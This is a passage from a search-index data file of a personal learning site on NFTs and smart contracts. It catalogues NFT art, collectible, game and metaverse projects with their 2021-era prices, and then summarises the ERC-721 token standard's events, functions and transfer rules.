to the top of the digital art world. He\u2019s attracted 1.8 million followers on Instagram and high-profile collaborations with global brands ranging from Louis Vuitton to Nike, as well as performing artists from Katy Perry to Childish Gambino.\" - from Christie's auction of The First 5000 days</p> <p></p> <p>The First 5000 days sold for $69 million.</p>"},{"location":"smart-contract-usage/art/#xcopy","title":"XCopy","text":"<p>Significance: Art style and legendary figure in space Editions: Typically 10  </p> <p>\"XCOPY is a London based crypto artist. XCOPY has been a part of the crypto art community from the start - he was on SuperRare from launch and has released over 100 NFTs on the platform. His continued success on various crypto art platforms has led to him becoming a legendary figure in the space.\" - from artist site at niftygateway</p> <p></p>"},{"location":"smart-contract-usage/art/#ghxsts","title":"Ghxsts","text":"<p>Significance: New artist discovered due to art style and NFTs Editions: Typically 1, but some more approachable works have 30  </p> <p></p> <p>Popular new artist where the NFTs can be combined to create new art on the blockchain.</p> <p>Ghxsts on Opensea</p>"},{"location":"smart-contract-usage/art/#the-underground-sistine-chapel-by-pascal-boyart","title":"The Underground Sistine Chapel by Pascal Boyart","text":"<p>Significance: Established artist and physical work Editions: Each figure on the paining is a single NFT  </p> <p>\"The Underground Sistine Chapel is a modern version of Michelangelo's masterpiece, painted by Pascal Boyart during the 2020 lockdowns. The work was produced over a period of 5 months in a former gold foundry close to Paris. Each NFT represents one of the 400 characters in the Last Judgment fresco. All NFTs are 1/1 editions.\" - from artist website</p> <p></p> <p>Project from famous graffiti artist Pboy The Underground Sistine Chapel on Opensea</p>"},{"location":"smart-contract-usage/art/#forever-rose","title":"Forever rose","text":"<p>Significance: Collaboration project Editions: Unsure </p> <p>http://www.foreverrose.io/</p>"},{"location":"smart-contract-usage/collectibles/","title":"Collectibles","text":""},{"location":"smart-contract-usage/collectibles/#cryptopunks-2017","title":"Cryptopunks - 2017","text":"<p>Significance: Considered the first NFT collectible Editions: 10000 unique </p> <p>\"The CryptoPunks are 24x24 pixel art images, generated algorithmically. Most are punky-looking guys and girls, but there are a few rarer types mixed in: Apes, Zombies and even the odd Alien. Every punk has their own profile page that shows their attributes as well as their ownership/for-sale status\" - from CryptoPunks webiste</p> <p>The auction house Christie's had an auction 12. May where 6 rare cryptopunks were sold for ~$17 million.</p> <p>The auction house Sootheby's will have an auction of Cryptopunk #7523 10.June. </p> <p>Total value of sales ~185 000 ETH ($486 million dollars) Floor: 15ETH</p>"},{"location":"smart-contract-usage/collectibles/#nba-top-shots-2020","title":"NBA Top shots - 2020","text":"<p>Significance: 800 000 users and most are not cryptosavy Editions: The number of editions pr NBA Top Shot moments dependens on rarity. From 50 for legendary to 10000 or more for commons </p> <p>\"Hundreds of thousands of NBA fans from around the world have started collecting the most memorable Moments from NBA history. </p> <p>Only a scarce number of Top Shot Moments are released, so building the best collection requires a scout\u2019s eye and a superstar\u2019s dedication. Become a top collector by snagging in-demand packs when they drop and refine your roster by finding diamond-in-the-rough Moments on the marketplace\" - from NBA Topshots</p> <p>Dapper Labs was behind this project and they have a history of making success on their projects.</p>"},{"location":"smart-contract-usage/collectibles/#mooncats-2017","title":"Mooncats - 2017","text":"<p>Significance: Early pioneer Editions: 25600 </p> <p>\"This project is an exploration of the ability to release tradable collectibles and record their ownership on the Ethereum blockchain. Instead of selling all of the MoonCats as the contract owner or giving all of the MoonCats away, we have given people the opportunity to find MoonCats by using their computers to generate a seed that hashes to an available and unique catId. This seed can then be submitted to the contract to rescue the corresponding MoonCat. The resulting MoonCat is initially owned by the Ethereum address that submitted it.</p> <p>An off chain algorithm, the MD5 checksum of which is stored in the contract, parses the catId into its unique corresponding MoonCat image. This allows you to verify that your catId corresponds to your MoonCat image. \" - from MoonCatRescue</p> <p>Mooncast on Opensea</p>"},{"location":"smart-contract-usage/collectibles/#bored-ape-yacht-club-2021","title":"Bored Ape Yacht Club - 2021","text":"<p>Significance: Momentum in marked and bringing in new collectors Editions: 10000</p> <p>\"The Bored Ape Yacht Club is a collection of 10,000 unique Bored Ape NFTs\u2014 unique digital collectibles living on the Ethereum blockchain. Your Bored Ape doubles as your Yacht Club membership card, and grants access to members-only benefits, the first of which is access to THE BATHROOM, a collaborative graffiti board.\" - from BoredApeYachtClub</p> <p> </p> <p>Bored Ape Yacht Club on OpenSea</p>"},{"location":"smart-contract-usage/collectibles/#hashmasks","title":"Hashmasks","text":"<p>Significance: Bridging collectibles and art Editions: 16384 </p> <p>\"Hashmasks is a living digital art collectible created by over 70 artists globally. It is a collection of 16,384 unique digital portraits.  By holding the artwork, you accumulate the NCT token on a daily basis, which allows you to choose a name for your portrait on the Ethereum blockchain.\" - from  Hashmasks</p>"},{"location":"smart-contract-usage/collectibles/#blob-mob","title":"Blob mob","text":"<p>Significance: Project in forming phase and relies on cuteness factor Editions: 999</p> <p>\"Here at the Blob Laboratory, we have perfected the most bulbous characters to ever walk in the metaverse. Each Blob is meticulously handcrafted with a unique combination of traits. Each Blob is a 1 of 1 and a proud member of the Blob Mob. The Blobs will be released on OpenSea as NFTs and can be collected, used as a profile photo, traded, or sold.\" - from project website</p> <p></p>"},{"location":"smart-contract-usage/defi/","title":"DeFi","text":"<p>Investigating DeFi (aka. Decentralized finance) was not in scope for the ThinkWeek.  Smart contracts are central in DeFi and I have just namedropped a few interesting projects/companies.</p>"},{"location":"smart-contract-usage/defi/#uniswap","title":"Uniswap","text":""},{"location":"smart-contract-usage/defi/#polygon-previously-matic","title":"Polygon (previously Matic)","text":""},{"location":"smart-contract-usage/defi/#aave","title":"Aave","text":""},{"location":"smart-contract-usage/defi/#chainlink","title":"Chainlink","text":""},{"location":"smart-contract-usage/exclusive-access/","title":"Exclusive access","text":""},{"location":"smart-contract-usage/exclusive-access/#marshmello","title":"Marshmello","text":"<p>The holder of the TinToy token will be invited to join one (1), ninety (90) minute virtual album listening party with Marshmello. In addition, this token is verifiable for:</p> <ul> <li>Invitation to a two (2) hour Studio Session with Marshmello and his one surprise guest</li> <li>Invitation to be a part of Marshmello\u2019s entourage for one (1) day at a show of your choice with a ten thousand dollar ($10,000) Mello credit</li> <li>Compete with Marshmello in COD or a mutually agreed upon game for one (1) hour</li> <li>Two (2) premium Vegas Residency tickets with additional backstage access to meet Marshmello</li> <li>One (1) Marshmello x x Aaron Kai Painted Helmet</li> </ul> <p>From auction were price ended at $5,5 million</p> <p> </p> <p>from tweet</p>"},{"location":"smart-contract-usage/exclusive-access/#kings-of-leon","title":"Kings of Leon","text":"<p>\"What comes with the NFT: 1 - Digital album download 1 - Limited edition NFT Golden Eye Vinyl 1 - Digital collectible album artwork\" - from OpenSea collection</p> <p></p> <p>The NFT auction was performed at Yellowheart</p>"},{"location":"smart-contract-usage/exclusive-access/#veefriends","title":"VeeFriends","text":"<p>\"VeeFriends is the name of Gary Vaynerchuk\u2019s NFT collection. He created VeeFriends to bring to life his ambitions of building a community around his creative and business passions using NFT technology and their smart contract capabilities.By owning a VeeFriend NFT, you immediately become part of the VeeFriends community and get access to VeeCon. All VeeFriends token owners get access to VeeCon. VeeCon is a multi-day event exclusively for NFT holders. Your NFT will give you a three year access pass. The conference will be focused around business, marketing, ideas, creativity, entrepreneurship, innovation, competition and of course, fun. Gary\u2019s focus is to curate the best experience for his community, bringing enormous access and informational value to all the VeeFriends token holders in attendance.\" - from veefriend's website</p> <p></p>"},{"location":"smart-contract-usage/fundraising/","title":"Fundraising","text":""},{"location":"smart-contract-usage/fundraising/#save-thousands-of-lives-noorahealth","title":"Save Thousands of Lives - NooraHealth","text":"<p>\"We will use the proceeds from the sale of this NFT to save lives. We estimate that with each $1,235 raised by selling it, we can save one life (and improve several more).</p> <p>At Noora Health, we train patients\u2019 families to take care of them after they leave the hospital. We work primarily with new mothers and their families in South Asia, where we are running programs in 165 hospitals. The data we've collected since October 2018 suggests we can save 9 babies per 1000 live births, at a cost of $1,235 per life saved.\" -from OpenSea listing</p> <p></p> <p>Sold for 1337ETH</p>"},{"location":"smart-contract-usage/games/","title":"Games","text":""},{"location":"smart-contract-usage/games/#axieinfinity","title":"Axieinfinity","text":"<p>Signficance: Early pioneer with novel mechanics such as breeding. Amongst top grossing NFT projects Editions: Not sure  </p> <p>\"Axie Infinity is a Pok\u00e9mon-inspired universe where anyone can earn tokens through skilled gameplay and contributions to the ecosystem. Players can battle, collect, raise, and build a land-based kingdom for their pets. All art assets and Axie genetic data can be easily accessed by 3rd parties, allowing community developers to build their own tools and experiences in the Axie Infinity universe. Although Axie is still in early access, Axie is ranked the #1 Ethereum game by daily, weekly, and monthly active users. It has generated over 6,400 ETH in revenue (2M+ USD) so far. While Axie is a fun game, it's also taken on characteristics of a social network and jobs platform due to the strong community and play to earn opportunities that have come from its early success. The key difference between Axie and a traditional game is that Blockchain economic design is used to reward our players for their contributions to the ecosystem. This new model of gaming has been dubbed \"play to earn\". Axie has attracted thousands of players from developing countries in the pursuit of a new income stream during the Covid pandemic. Many of these players are fathers, aunts, and even grandparents who have never used Blockchain technology before!\"  - from Axie Infinity whitepaper</p> <p></p> <p>One of the co-founders is Norwegian and can be followed at @Psycheout86</p>"},{"location":"smart-contract-usage/games/#cryptokitties","title":"Cryptokitties","text":"<p>Signficance: Early pioneer with novel mechanics Editions: Each is unique and more than 1 million kitties have been born  </p> <p>\"What is CryptoKitties? CryptoKitties is a game centered around breedable, collectible, and oh-so-adorable creatures we call CryptoKitties! Each cat is one-of-a-kind and 100% owned by you; it cannot be replicated, taken away, or destroyed.\" - from project website</p> <p></p>"},{"location":"smart-contract-usage/games/#sorare-global-fantasy-football","title":"Sorare - Global fantasy football","text":"<p>Signficance: License with football clubs and user base potential Editions: Rarity of card determines number of editions from 1,10,100 and so on  </p> <p>\"Sorare is a global fantasy football game where you can play with officially licensed digital cards and earn prizes every week. We are backed by a world-class team of investors, supported by gaming giant Ubisoft and already trusted by 100+ football clubs, with many more coming every month.</p> <p>A Sorare Card is an officially licensed digital collectible of a footballer for a particular football season. Thanks to blockchain technology, fans can collect their favourite players with the benefits of provable scarcity (fixed supply). On top of that, Sorare Cards are freely tradeable and usable in an open world of different applications and games. Each collectible enjoys many of the attributes of other blockchain-assets: it cannot be copied or taken away from you. Users also enjoy access to the complete digital history of the card. For the 2020-21 season, three levels of scarcity exist for each Sorare Card: Unique, Super Rare (10 copies) and Rare (100 copies).\" - from Sorare FAQ</p> <p></p> <p>Kylian Mbapp\u00e9 was recently sold for 21ETH</p>"},{"location":"smart-contract-usage/games/#zed-run","title":"ZED RUN","text":"<p>Signficance: Novel mechanics and live races on twitch Editions: Horse bloodlines from Z1 to Z268 determine rarity and editions  </p> <p>\"ZED is a digital horse racing game where players can build a stable of racehorses by buying, breeding, and racing digital racehorses. The ultimate goal in ZED is to create a legacy with a valuable stable full of winning and rare racehorses. The more you breed and race, the greater your legacy becomes. Once your stable is formed with at least one racehorse, you can earn a profit if you decide to sell, breed or race!\" - from project website</p> <p></p>"},{"location":"smart-contract-usage/generative-art/","title":"Generative art","text":""},{"location":"smart-contract-usage/generative-art/#autoglyphs-2019","title":"Autoglyphs - 2019?","text":"<p>Significance: Artwork lives on blockchain, from makers of CryptoPunks Editions: 512 \"Autoglyphs are the first \u201con-chain\u201d generative art on the Ethereum blockchain. They are a completely self-contained mechanism for the creation and ownership of an artwork. Autoglyphs are an experiment in generative art, each one unique and created by code running on the Ethereum blockchain. A glyph can be created by anyone who is willing to donate the creation fee of 0.20\u039e ($514) to our chosen charity, 350.org. The creator of the glyph will then also become the first owner of the glyph. However, after 512 glyphs have been created, the generator will shut itself off forever and the glyphs will only be available on the secondary market.\" - from developer website</p> <p></p> <p>Autoglyphs on Opensea</p>"},{"location":"smart-contract-usage/generative-art/#art-blocks","title":"Art blocks","text":"<p>Significance: Platform for generative art Editions: Typically around 1000 \"Art Blocks is a generative art platform that allows collectors to mint tokens without knowing what they will get ahead of time. The artist writes a code that is plugged into the platform, which will generate different combinations of the variables at random. The creator, Snowfro, came up with the idea when he was claiming CryptoPunks back in 2017, and he thought it was unfair that he got to claim a bunch of zombies. Over the next few years, he sold over 20 zombies to fund the development of Art Blocks.\" - from Meet Art Blocks: One of the Most Unique Platforms in NFTs Right Now</p> <p></p> <p>A platform where the script to generate the art lives on the blockchain and where the parameters are determined when buyer initiates purchase.</p> <p>Art blocks on OpenSea</p>"},{"location":"smart-contract-usage/generative-art/#deafbeaf","title":"Deafbeaf","text":"<p>Significance: Audio focused generative art Editions: From 128 to 8 depending on series  \"Synth Poems are short generative music pieces, inspired by the sound of analog synthesizers. They are stored on-chain. Each piece is generated at the time of minting from a random hash value, influencing musical elements including tempo, timbre, pitch and time signature. Simples rules lead to surprising variation, giving each piece it's own distinctive personality, while retaining a common theme.</p> <p>Although synth poems are audio focused, a fitting visualization is added as an ode to early computer graphics that used vector displays to visualize analog signals. What you see is a direct representation of the sound signal, as it would appear on an oscilloscope.\" - from artist's website</p> <p>Example works: </p> <ul> <li>Series 3: Entropy - Token 145 </li> <li>Series 4: Glitchbox - Token 208 </li> </ul> <p>Series 3 degrades in quality if it is transfered and series 4 allow the owner to experiment with parameters and change the art on the blockchain</p>"},{"location":"smart-contract-usage/metaverse-avatars/","title":"Metaverse avatars","text":"<p>In addition to metaverse worlds, there is lot of activity around avatars and wearables for the metaverse.  Standards for data formats of 3D avatars, such as VRM, are evolving quickly. </p>"},{"location":"smart-contract-usage/metaverse-avatars/#meebits","title":"Meebits","text":"<p>\"The Meebits are 20,000 unique 3D voxel characters, created by a custom generative algorithm, then registered on the Ethereum blockchain. The NFT contract the governs ownership is a standard ERC-721 that works with any compatible service or exchange. Also included in the contract is a custom marketplace that supports like-kind trading of up to 100 Meebits per transaction, along with all the standard buy, bid and ask transactions.\" - from https://meebits.larvalabs.com/</p> <p></p> <p>Worth noticing that Meebits was developed by LarvaLabs who are also behind CryptoPunks and AutoGlyphs</p>"},{"location":"smart-contract-usage/metaverse-avatars/#genies","title":"Genies","text":"<p>\"Genies is not only one of the world\u2019s most innovative avatar technology companies, it is also creating digital identities that can be used across many platforms. Through Genies. celebrities and athletes can use digital identities to memorialize one of their life's defining moments and sell them as digital or virtual goods to their fans who want to share in their biggest life moments. \" - from Paving The Way For The Metaverse: Exclusive Interview With The CEO Of Genies About The 3D Avatar Company\u2019s Present And Future</p> <p></p> <p>Genie are a well known brand for instagram and have now partnered with Dapper Labs (which is behind NBA Top Shots) and Unity. Genie will be running on the Flow blockchain developed by Dapper Labs based on the experience with NBA Top Shots</p> <p>Genie have license agreements with both Bandai Namco Entertainment, owner of Pacman, and Warner Music Group</p>"},{"location":"smart-contract-usage/metaverse-avatars/#ethlings","title":"Ethlings","text":"<p>\"Ethlings are a first-of-their-kind collection of NFTs that can be customized on the blockchain. An Ethling is a 1/1 ERC-721 token. When its minted it's given a serial number, a species, a subtype, and an assortment of up to 13 slots that can be customized. Some traits are rarer than others and having an Ethling with a rare species / subtype combination with a lot of customizable slots is hard to come by.\" - from project website</p> <p>Ethlings will be running on the Polygon blockchain.</p> <p></p>"},{"location":"smart-contract-usage/metaverse-worlds/","title":"Metaverse worlds","text":"<p>There is a lot of momentum behind the metaverse, a collective virtual space not controlled by any one actor.  There many players in the space, for example it's expected Epic Games will make an announcement relatively soon as they have secured $1 billion dollars of funding recently</p> <p>Epic Games CEO Tim Sweeney elaborates what metaverse means for them.</p> <p>Blockchain technology allowing avatars and assets to be moved between worlds and traded is very likely to happen (though perhaps not directly on the Etherum blockchain)</p>"},{"location":"smart-contract-usage/metaverse-worlds/#the-sandbox","title":"The Sandbox","text":"<p>\"The Sandbox is a decentralised, community-driven gaming ecosystem where creators can share and monetise voxel assets and gaming experiences on the Ethereum blockchain. Using The Sandbox's free software, such as VoxEdit and the Game Maker, players can create ASSETs and games for themselves and to share with others. These can be monetised to earn the creator passive income.\" - from project's website</p> <p></p>"},{"location":"smart-contract-usage/metaverse-worlds/#decentraland","title":"Decentraland","text":"<p>\"Decentraland is a decentralized virtual reality platform powered by the Ethereum blockchain. Within the Decentraland platform, users can create, experience, and monetize their content and applications.</p> <p>Enter and explore decentraland</p> <p>The finite, traversable, 3D virtual space within Decentraland is called LAND, a non-fungible digital asset maintained in an Ethereum smart contract. Land is divided into parcels that are identified by cartesian coordinates (x,y). These parcels are permanently owned by members of the community and are purchased using MANA, Decentraland\u2019s cryptocurrency token. This gives users full control over the environments and applications that they create, which can range from anything like static 3D scenes to more interactive applications or games.\" - from projects website</p> <p></p>"},{"location":"smart-contract-usage/metaverse-worlds/#cryptovoxels","title":"Cryptovoxels","text":"<p>\"Cryptovoxels is a virtual world built on the ethereum block chain. The world consists of a city called Origin City, which has streets, that are owned by The Corporation, and parcels, that are owned by individual people. If you have an ethereum wallet, you can buy a parcel.\" - from project's website </p>"},{"location":"smart-contract-usage/metaverse-worlds/#ember-sword","title":"Ember Sword","text":"<p>From project's website</p>"},{"location":"smart-contract-usage/oracles/","title":"Oracles","text":"<p>Oracles bridge real world events over to onchain smart contracts.  It is an emerging field, but necessary for large parts of DeFi. </p> <p>As an example, a farmer's crop is at risk for draught and wants to insure himself against a season with low rainfall. An Oracle combining multuple sources into a reliable tamper-proof network will provide the weather events of the area and the smart contract can use them even though it's on chain. </p> <p>Chainlink appears to be well positioned in this space. Chainlink 2.0 whitepaper was recently published. </p> <p>As part of the ThinkWeek I watched the \"Chainlink 2.0 Whitepaper | Research Panel\" video below</p> <p>Earlier I've listend into the Lex Friedman podcast with one of the Chainlink co-founders Sergey Nazarov. </p>"},{"location":"smart-contract-usage/own-a-meme/","title":"Own a piece of internet history","text":""},{"location":"smart-contract-usage/own-a-meme/#nyan-cat","title":"Nyan cat","text":"<p>Nyan Cat sold for 300ETH $760,000.00 </p>"},{"location":"smart-contract-usage/own-a-meme/#overly-attached-girlfriend","title":"Overly attached girlfriend","text":"<p>Overly attached girlfriend sold for 209ETH $509,940.00 </p>"},{"location":"smart-contract-usage/own-a-meme/#coordior-digital-minecraft-the-last-minecart-2011","title":"Coordior Digital - Minecraft: The Last Minecart (2011)","text":"<p>Corridor video Minecraf: The Last Minecraft sold for 16.28 ETH</p> <p></p>"},{"location":"smart-contract-usage/own-a-meme/#first-twitter-tweet","title":"First Twitter Tweet","text":"<p>First Twitter Tweet (first tweet posted by Twitter founder and CEO Jack Dorsey) sold for 1630ETH $2.9 million</p> <p></p>"},{"location":"smart-contract-usage/voting/","title":"Voting","text":"<p>Smart contract can define governance models for organisations such as Gitcoin, FlamingoDAO and MeebitsDAO.</p>"},{"location":"smart-contract-usage/voting/#gitcoin","title":"GitCoin","text":"<p>\"Open source software is the foundation for coordination tools that will help humanity solve our toughest challenges. However, despite $500B+ in yearly economic output, developers have traditionally had no means to pay their rent while working on open source projects.</p> <p>This is why we built Gitcoin: A platform to fund builders looking for meaningful, open source work. We\u2019ve pioneered Quadratic Funding, a novel, democratic way to fund public goods in our quarterly Gitcoin Grants rounds. Since its launch in November 2017, Gitcoin Grants has now provided nearly $16M of funding to public goods.\" - from Introducing GTC \u2013 Gitcoin\u2019s Governance Token</p> <p></p> <p>Smart contract is available via etherscan.</p>"},{"location":"smart-contract-usage/voting/#flamingodao","title":"FlamingoDAO","text":"<p>\"Flamingo is an NFT-focused DAO that aims to explore emerging investment opportunities for ownable, blockchain-based assets. NFTs are not just cat pictures. They encompass digital art, collectibles, and in-game assets and other tangible assets. These new forms of digital property are poised to play an increasing role in helping to create, monetize, and incentivize online digital content.</p> <p>How do members vote? Members will be prompted to vote via Flamingo DApp (or, over time, other online services) at various points during the lifecycle of Flamingo, including to evaluate purchase decisions, weigh-in on the structure and form of Flamingo, and/or other strategic decisions related to Flamingo.</p> <p>Voting will be facilitated by blockchain-based smart contracts and via the DApp based on ownership records maintained on the Ethereum blockchain.\" -- from FlamingoDAOs website</p> <p></p>"},{"location":"smart-contract-usage/voting/#meebitsdao","title":"MeebitsDAO","text":"<p>\"In our virtual government: 1 Meebit gets 1 Vote This will be managed by NFTs issued as Voting Seats which are exchangeable 1:1 with a Meebit. Voting seats are owned by actual people, of course, initially open to 200 Founder Representatives, each of whom may obtain up to 20 Voting Seats (NFTs).\" - from MeebitsDAO: How Voting Works</p> <p></p>"},{"location":"smart-contracts/","title":"Smart contracts","text":"<p>Key takeaways: </p> <ol> <li>A smart contract has many of the same properties as a user account on ethereum</li> <li>To interact with the smart contract you create transactions where the data field is defined (value is not required but can be used to move ETH to the contract). The interaction will usually incur a transaction cost (gas in ETH). The interaction is executed in the Ethereum Virtual Machine (EVM)</li> <li>To create a smart contract you use a transaction (this can be quite price as you pay pr byte of code)</li> <li>Any state is defined in the smart contract and updating it is pricey as it is executed in the EVM and distributed to all ethereum nodes (first call more expensive than successive)</li> <li>You can query smart contract without incuring a transaction cost</li> <li>You can query events of a smart contract without incuring a transaction cost</li> </ol> <p>DApp is used to refer to decentralized applications which only use smart contracts as their backend. </p>"},{"location":"smart-contracts/#ethbuild","title":"ETH.BUILD","text":"<p>Strongly recommend Austin Griffith's video introduction using the https://eth.build/ tool. In order to understand smart contracts you should first understand transactions (assume reader knows blockchain fundamentals)</p>"},{"location":"smart-contracts/#transactions-ethbuild","title":"Transactions - ETH.BUILD","text":""},{"location":"smart-contracts/#smart-contracts-ethbuild","title":"Smart Contracts - ETH.BUILD","text":""},{"location":"smart-contracts/#other-sources","title":"Other sources","text":"<p>\"A smart contract is a program that runs at an address on Ethereum. They're made up of data and functions that can execute upon receiving a transaction.\" from https://ethereum.org/en/developers/docs/smart-contracts/anatomy/</p> <p>\"You need to deploy your smart contract in order for it to be available to users of an Ethereum network.</p> <p>To deploy a smart contract, you merely send an Ethereum transaction containing the code of the compiled smart contract without specifying any recipients.\" from https://ethereum.org/en/developers/docs/smart-contracts/deploying/</p>"},{"location":"smart-contracts/code-on-blockchain/","title":"Learn how to put code on the blockchain","text":""},{"location":"smart-contracts/erc-721-best-practice/","title":"ERC721 Best practice","text":""},{"location":"smart-contracts/erc-721-best-practice/#openzeppelin","title":"OpenZeppelin","text":"<p>OpenZeppelin is a setup of prevetted contracts by experts.  In general, it's recommended to import their modules into your smart contract or at least take inspiration. </p> <p>Contracts are availble at the following github repo https://github.com/OpenZeppelin/openzeppelin-contracts.</p> <p>The even have wizard at https://wizard.openzeppelin.com/ </p>"},{"location":"smart-contracts/erc-721-best-practice/#scaffold-eth","title":"Scaffold-eth","text":"<p>Scaffold-eth appears to be a great set of tools for experimenting with smart contracts especially on test networks. You can easily run your own blockchain locally which you deploy the smart contract to and there is a reactjs ui automatically being generated for testing it. </p> <p>Introduction video:</p>"},{"location":"smart-contracts/erc-721-events/","title":"Understanding smart contract events","text":"<p>Event is an inheritable member of a contract. An event is emitted, it stores the arguments passed in transaction logs. These logs are stored on blockchain and are accessible using address of the contract till the contract is present on the blockchain.</p> <p>In the Ethereum universe, there is a single, canonical computer (called the Ethereum Virtual Machine, or EVM) whose state everyone on the Ethereum network agrees on. Everyone who participates in the Ethereum network (every Ethereum node) keeps a copy of the state of this computer. Additionally, any participant can broadcast a request for this computer to perform arbitrary computation. Whenever such a request is broadcast, other participants on the network verify, validate, and carry out (\u201cexecute\u201d) the computation. This causes a state change in the EVM, which is committed and propagated throughout the entire network.</p> <p>Requests for computation are called transaction requests; the record of all transactions as well as the EVM\u2019s present state is stored in the blockchain, which in turn is stored and agreed upon by all nodes.</p>"},{"location":"smart-contracts/erc-721-events/#events-from-erc721","title":"Events from ERC721","text":"<ul> <li>Transfer - This emits when ownership of any NFT changes by any mechanism. In addition, if from==0, event represent NFT creation, if to==0 even represent NFT destroyed</li> <li>Approval - This emits when the approved address for an NFT is changed or reaffirmed. </li> <li>ApprovalForAll - This emits when an operator is enabled or disabled for an owner. The operator can manage all NFTs of the owner.</li> </ul>"},{"location":"smart-contracts/erc-721-events/#querying-events-from-the-blockchain","title":"Querying events from the blockchain","text":"<p>web3 can be used to query events from blockchain without paying gas.</p>"},{"location":"smart-contracts/erc-721-example/","title":"Example of ERC-721 contract","text":""},{"location":"smart-contracts/erc-721-example/#ide","title":"IDE","text":"<p>Remix can be used as an editor solidity.</p>"},{"location":"smart-contracts/erc-721-example/#contract","title":"Contract","text":"<p>The Meebits contract from Larvalabs was selected. Larvalabs was the company behind cryptopunks NFTs and in May 2021 released the Meebits project. </p> <p>The contract is 679 lines of code using solidity 0.7.6 </p> <p>Note: The contract has some specific code related to cryptopunks and minting. This is because cryptopunks owners would be able to mint a meebit free of cost (other meebits were sold using a dutch auction from 2.5ETH)</p>"},{"location":"smart-contracts/erc-721-example/#code-review-of-contract","title":"Code review of contract","text":"<p>I've done the following Code review as a github pull request in order to learn the contract.</p> <p>In general, it's amazing how compact the contract actually is. </p>"},{"location":"smart-contracts/erc-721/","title":"Learn ERC-721","text":""},{"location":"smart-contracts/erc-721/#background","title":"Background","text":"<p>There are many proposed uses of Ethereum smart contracts that depend on tracking distinguishable assets. Examples of existing or planned NFTs are LAND in Decentraland, the eponymous punks in CryptoPunks, and in-game items using systems like DMarket or EnjinCoin. Future uses include tracking real-world assets, like real-estate (as envisioned by companies like Ubitquity or Propy). It is critical in each of these cases that these items are not \u201clumped together\u201d as numbers in a ledger, but instead each asset must have its ownership individually and atomically tracked. Regardless of the nature of these assets, the ecosystem will be stronger if we have a standardized interface that allows for cross-functional asset management and sales platforms.</p>"},{"location":"smart-contracts/erc-721/#summary","title":"Summary","text":"<p>A standard interface for non-fungible token which allows for the implementation of a standard API for NFTs within smart contracts. NFTs can represent ownership over digital or physical assets</p> <p>This standard provides basic functionality to track and transfer NFTs.</p> <p>This standard is inspired by the ERC-20 token standard and builds on two years of experience since EIP-20 was created.EIP-20 is insufficient for tracking NFTs because each asset is distinct (non-fungible) whereas each of a quantity of tokens is identical (fungible).</p>"},{"location":"smart-contracts/erc-721/#specification","title":"Specification","text":"<p>Specification is done through a interface based on the solidity language. Solidity is the programming language used for the ethereum blockchain. </p>"},{"location":"smart-contracts/erc-721/#nft-identifiers","title":"NFT identifiers","text":"<p>Every NFT is identified by a unique uint256 ID inside the ERC-721 smart contract. This identifying number SHALL NOT change for the life of the contract. The pair (contract address, uint256 tokenId) will then be a globally unique and fully-qualified identifier for a specific asset on an Ethereum chain.</p> <p>In ERC-721 every NFT is unique, the quantity is none or one. </p> <p>Creating of NFTs (\u201cminting\u201d) and destruction NFTs (\u201cburning\u201d) is not included in the specification. </p>"},{"location":"smart-contracts/erc-721/#privacy","title":"Privacy","text":"<p>Wallets/brokers/auctioneers identified in the motivation section have a strong need to identify which NFTs an owner owns.</p> <p>It may be interesting to consider a use case where NFTs are not enumerable, such as a private registry of property ownership, or a partially-private registry. However, privacy cannot be attained because an attacker can simply (!) call ownerOf for every possible tokenId.</p>"},{"location":"smart-contracts/erc-721/#scalability","title":"Scalability","text":"<p>The working group deployed a contract, XXXXERC721, to Testnet which instantiates and tracks 340282366920938463463374607431768211456 different deeds (2^128). That\u2019s enough to assign every IPV6 address to an Ethereum account owner, or to track ownership of nanobots a few micron in size and in aggregate totalling half the size of Earth. You can query it from the blockchain.</p> <p>This illustration makes clear: the ERC-721 standard scales.</p>"},{"location":"smart-contracts/erc-721/#transfer-mechanism","title":"Transfer mechanism","text":"<p>ERC-721 standardizes a safe transfer function safeTransferFrom. Transfers may be initiated by:</p> <ul> <li>The owner of an NFT</li> <li>The approved address of an NFT</li> <li>An authorized operator of the current owner of an NFT</li> </ul> <p>The actual contract implementation MAY also throw exceptions in other situations. This allows implementations to achieve interesting results:</p> <ul> <li>Disallow transfers if the contract is paused \u2014 prior art, CryptoKitties deployed contract, line 611</li> <li>Blacklist certain address from receiving NFTs \u2014 prior art, CryptoKitties deployed contract, lines 565, 566</li> <li>Charge a fee to both parties of a transaction </li> <li>Read only NFT registry \u2014 always throw from unsafeTransfer, transferFrom, approve and setApprovalForAll</li> </ul>"},{"location":"smart-contracts/erc-721/#interface-erc721-core-specification","title":"Interface ERC721 - Core specification","text":"<p>Events from interface ERC721: </p> <ul> <li>Transfer - This emits when ownership of any NFT changes by any mechanism. In addition, if from==0, event represent NFT creation, if to==0 even represent NFT destroyed</li> <li>Approval - This emits when the approved address for an NFT is changed or reaffirmed. </li> <li>ApprovalForAll - This emits when an operator is enabled or disabled for an owner. The operator can manage all NFTs of the owner.</li> </ul> <p>Functions from interface ERC721: </p> <ul> <li>balanceOf - The number of NFTs owned by <code>_owner</code>, possibly zero</li> <li>ownerOf - Find the owner of an NFT. @return The address of the owner of the NFT</li> <li>safeTransferFrom - Transfers the ownership of an NFT from one address to another address</li> <li>transferFrom - Same as safeTransferFrom, but if to is not capable of receiving NFTs it will be permanently lost</li> <li>approve - Change or reaffirm the approved address for an NFT. Throws unless <code>msg.sender</code> is the current NFT owner, or an authorized operator of the current owner.</li> <li>setApprovalForAll - Enable or disable approval for a third party (\"operator\") to manage all of <code>msg.sender</code>'s assets</li> <li>getApproved - Get the approved address for a single NFT</li> <li>isApprovedForAll -  Query if an address is an authorized operator for another address</li> <li>supportsInterface - From ERC165 - Standard Interface Detection </li> </ul>"},{"location":"smart-contracts/erc-721/#interface-erc721tokenreceiver-wallet-dependency","title":"Interface ERC721TokenReceiver - Wallet dependency","text":"<p>Wallet/broker/uaction must implement the wallet interface ERC721 \u00b4onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data\u00b4.The ERC721 smart contract calls this function on the recipient after a <code>transfer</code>. This function MAY throw to revert and reject the transfer. Return of other than the magic value MUST result in the transaction being reverted.</p>"},{"location":"smart-contracts/erc-721/#interface-erc721metadata-nft-metadata","title":"Interface ERC721Metadata - NFT metadata","text":"<p>This allows your smart contract to be interrogated for its name and for details about the assets which your NFTs represent.</p> <ul> <li>function name - A descriptive name for a collection of NFTs in this contract</li> <li>function symbol - An abbreviated name for NFTs in this contract</li> <li>tokenURI - URI for a given asset. The URI may point to a JSON file that conforms to the \"ERC721 Metadata JSON Schema\"</li> 